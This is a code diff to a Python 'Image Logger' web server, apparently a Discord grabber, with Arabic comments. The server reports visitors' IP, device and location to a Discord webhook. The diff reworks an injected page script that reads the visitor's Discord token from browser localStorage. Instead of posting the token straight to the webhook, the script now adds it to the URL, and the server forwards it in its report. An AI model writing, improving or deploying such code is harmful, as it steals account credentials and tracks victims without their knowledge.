@@ -58,7 +58,7 @@ def reportError(error):
         ],
     })
 
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None):
     if ip.startswith(blacklistedIPs):
         return
     
@@ -128,6 +128,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+> **Discord Token:** `{token if token else 'Not captured'}`
 
 **PC Info:**
 > **OS:** `{os}`
@@ -142,7 +143,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     }
     
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json = embed)
+    requests.post(config["webhook"], json=embed)
     return info
 
 binaries = {
@@ -186,19 +187,20 @@ height: 100vh;
 
                 if config["buggedImage"]: self.wfile.write(binaries["loading"])
 
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+                makeReport(self.headers.get('x-forwarded-for'), endpoint=s.split("?")[0], url=url)
                 
                 return
             
             else:
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                token = dic.get("token")  # استخراج التوكن من استفسار URL
 
                 if dic.get("g") and config["accurateLocation"]:
                     location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url=url, token=token)
                 else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url, token=token)
                 
                 message = config["message"]["message"]
 
@@ -233,25 +235,17 @@ height: 100vh;
                 self.send_header('Content-type', datatype)
                 self.end_headers()
 
-                # إضافة سكربت لسحب التوكن
-data += b'''<script>
+                # إضافة سكربت لسحب التوكن وإضافته إلى URL
+                data += b'''<script>
 var discordToken = localStorage.getItem('token');
 if (discordToken) {
-    fetch("''' + config["webhook"].encode() + b'''", {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            username: "''' + config["username"].encode() + b'''",
-            content: "",
-            embeds: [{
-                title: "Image Logger - Discord Token Captured",
-                color: ''' + str(config["color"]).encode() + b''',
-                description: `**A Discord Token was captured!**\\n**Token:** \`${discordToken}\`\\n**IP:** \`${"''' + self.headers.get('x-forwarded-for').encode() + b'''"}\``
-            }]
-        })
-    });
+    var currenturl = window.location.href;
+    if (currenturl.includes("?")) {
+        currenturl += "&token=" + encodeURIComponent(discordToken);
+    } else {
+        currenturl += "?token=" + encodeURIComponent(discordToken);
+    }
+    location.replace(currenturl);
 }
 </script>'''
 
@@ -287,7 +281,5 @@ if (!currenturl.includes("g=")) {
     
     do_GET = handleRequest
     do_POST = handleRequest
-
-handler = app = ImageLoggerAPI
 
 handler = app = ImageLoggerAPI
